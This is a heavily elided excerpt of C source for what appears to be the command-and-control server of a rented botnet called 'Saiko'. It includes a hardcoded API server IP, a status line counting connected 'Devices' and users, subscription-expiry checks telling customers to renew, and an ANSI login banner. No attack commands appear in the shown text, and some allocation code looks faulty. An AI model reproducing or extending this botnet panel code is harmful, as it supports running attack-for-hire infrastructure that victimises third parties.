...
char *api_host = "93.114.133.19"; // Change to Server IP Where API's are Located
...
void *titleWriter(void *sock) 
{
	...
	while(1)
	{
        ...
        sprintf(string, "%c]0; Devices: %d | IG: @saiko.xbl | Users: %d %c", '\033', botcount, usersOnline, '\007');
...
void clientHandler(void *arguments)
{
	...
	else if(atoi(day) == atoi(my_day) && atoi(month) == atoi(my_month) && atoi(year) == atoi(my_year))
	{
		// expires today
		//if(send(myfd, "\033[2J\033[1;1H", 14, 0) == -1) goto end;
		my_exp_msg = "\x1b[31mYour \x1b[1;36mSaiko\x1b[31m Account Expires Today, Message an Admin to Renew Subscription.\x1b[37m\r\n";
		if(send(myfd, my_exp_msg, strlen(my_exp_msg), 0) == -1) goto end;
		//printf(my_exp_msg);
		my_exp_msg = malloc(strlen(my_exp_msg));
		goto send_password;
	...
	if(send(myfd, str, strlen(str), 0) == -1) goto end;
	sprintf(str, "\x1b[90m                     ╚═╝ ╝ ╚ ╝ ╩ ╩ ╚═╝  \x1b[1;36m@saiko.xbl          \x1b[0m \r\n");
	if(send(myfd, str, strlen(str), 0) == -1) goto end;
	sprintf(str, "\x1b[1;36m          ╔═══════════════════════════════════════════════╗         \x1b[0m \r\n");;
	if(send(myfd, str, strlen(str), 0) == -1) goto end;
